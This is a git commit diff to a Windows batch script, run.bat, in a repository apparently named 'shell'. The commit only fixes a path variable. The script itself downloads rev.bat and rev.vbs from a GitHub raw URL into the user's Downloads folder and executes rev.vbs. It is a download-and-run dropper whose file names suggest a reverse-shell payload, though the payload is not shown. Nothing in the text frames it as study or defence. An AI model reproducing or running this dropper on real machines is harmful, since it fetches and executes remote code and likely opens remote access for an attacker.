09540b70716a83e5be94bcf96bca493b2ca1a29c
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 14:03:25 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,6 +1,6 @@
 @echo off
-set "user_dir=%USERPROFILE/Downloads%"
-curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%user_dir%\rev.bat"
-curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%user_dir%\rev.vbs"
-call %user_dir%\rev.vbs
+set "downloads_dir=%USERPROFILE\Downloads%"
+curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%downloads_dir%\rev.bat"
+curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%downloads_dir%\rev.vbs"
+call %downloads_dir%\rev.vbs
 exit
